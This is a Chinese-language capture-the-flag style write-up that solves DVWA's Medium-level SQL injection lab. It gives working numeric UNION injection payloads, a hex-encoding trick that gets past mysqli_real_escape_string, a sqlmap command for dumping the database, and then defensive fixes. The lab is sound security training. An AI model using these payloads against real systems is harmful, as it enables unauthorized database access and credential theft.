# DVWA SQL Injection (Medium) 通关 WriteUp

## 一、环境准备与源码分析

将 DVWA 安全级别设置为 **Medium**，进入 SQL Injection 模块。此时前端页面只提供下拉菜单选择 User ID，无法直接输入自定义 Payload，因此需要借助 Burp Suite 抓包改包。

查看 Medium 级别源码，关键代码如下：

```php
$id = mysqli_real_escape_string($connection, $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

与 Low 级别相比，Medium 有三处变化：

| 对比项       | Low                  | Medium                        |
| --- | --- | --- |
| 提交方式     | GET                  | POST                          |
| 输入过滤     | 无                   | `mysqli_real_escape_string()` |
| SQL 查询类型 | 字符型（单引号包裹） | 数字型（无引号）              |

`mysqli_real_escape_string()` 会转义单引号、双引号、反斜杠等特殊字符，导致传统的 `' or 1=1#` 失效。但开发者犯了一个关键错误：查询语句中的 `$id` **没有使用引号包裹**，参数变成数字型注入。数字型注入不需要闭合引号，因此转义函数形同虚设。

## 二、Burp Suite 抓包与注入点确认

### 1\. 配置代理并拦截请求

开启 Burp Suite 代理，浏览器访问 DVWA 的 SQL Injection 页面，选择任意 User ID（例如 `1`），点击 Submit。在 Burp 的 Proxy -> HTTP history 中找到该 POST 请求：

```http
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
Host: 127.0.0.1
...
Cookie: PHPSESSID=...; security=medium

id=1&Submit=Submit
```

将请求发送到 **Repeater** 模块，后续所有 Payload 都在 Repeater 中修改 `id` 参数并发送。

### 2\. 验证注入存在

在 Repeater 中修改请求体：

```text
id=1 and 1=1#    → 正常回显
id=1 and 1=2#    → 无回显或异常
```

如果 `#` 被截断，可改用 `--+`（URL 编码后的空格）或 `%23`。例如：

```text
id=1 and 1=1--+
id=1 and 1=2--+
```

确认数字型注入点存在。

## 三、手工注入完整流程

### 1\. 判断字段数量

使用 `ORDER BY` 确定原始查询的列数：

```text
id=1 order by 2#    → 正常
id=1 order by 3#    → 报错
```

说明当前查询共有 **2 个字段**。

### 2\. 确定回显位置

构造联合查询：

```text
id=1 union select 1,2#
```

页面中 First name 和 Surname 位置分别显示 `1` 和 `2`，确认两个字段均可回显。

### 3\. 获取数据库信息

**获取数据库版本：**

```text
id=1 union select 1,version()#
```

**获取当前数据库名：**

```text
id=1 union select 1,database()#
```

回显结果为 `dvwa`。

### 4\. 获取表名（十六进制绕过）

查询表名时，通常需要指定 `table_schema='dvwa'`，但单引号会被 `mysqli_real_escape_string()` 转义。此时可将字符串转换为十六进制表示，从而避免使用引号。

`dvwa` 的十六进制为 `0x64767761`，Payload：

```text
id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761#
```

回显表名：`access_log,guestbook,security_log,users`。

> 也可使用 `where table_schema=database()`，同样不需要引号。

### 5\. 获取字段名

`users` 的十六进制为 `0x7573657273`，Payload：

```text
id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#
```

回显字段名： `user_id,first_name,last_name,user,password,avatar,last_login,failed_login,role,account_enabled`等。

### 6\. 提取用户账号与密码

直接查询 `users` 表：

```text
id=1 union select user,password from users#
```

成功回显所有用户名及密码哈希值（MD5 格式），完成数据提取。

## 四、自动化工具验证（可选）

除手工注入外，也可使用 sqlmap 验证漏洞。由于 Medium 级别为 POST 提交，需指定请求文件或参数：

```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/" \
  --data="id=1&Submit=Submit" \
  --cookie="PHPSESSID=你的会话ID; security=medium" \
  --batch --dbs
```

后续可继续 `--tables`、`--columns`、`--dump` 提取数据。

## 五、漏洞成因与防御

**成因**：Medium 级别虽然使用了 `mysqli_real_escape_string()` 转义特殊字符，但 SQL 语句中的参数未加引号，属于数字型注入。转义函数只对字符串上下文有效，对数字型注入无效。攻击者无需闭合引号即可拼接恶意 SQL。

**正确防御**：

1. **参数化查询（首选）**  
   使用 PDO 或 MySQLi 预编译语句，将 SQL 结构与数据分离：
   ```php
    $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
    $stmt->execute([$id]);
   ```
2. **类型强制转换**  
   对于数字型参数，使用 `intval()` 或 `(int)` 强制转换：
   ```php
    $id = intval($_POST['id']);
   ```
3. **最小权限原则**  
   数据库账号只授予必要权限，避免攻击者通过注入获取敏感系统表信息。

Medium 级别是一个典型的“错误防御”案例：试图用转义函数代替参数化查询，反而因为查询类型变化导致绕过。核心解决方案始终是**预编译语句**。
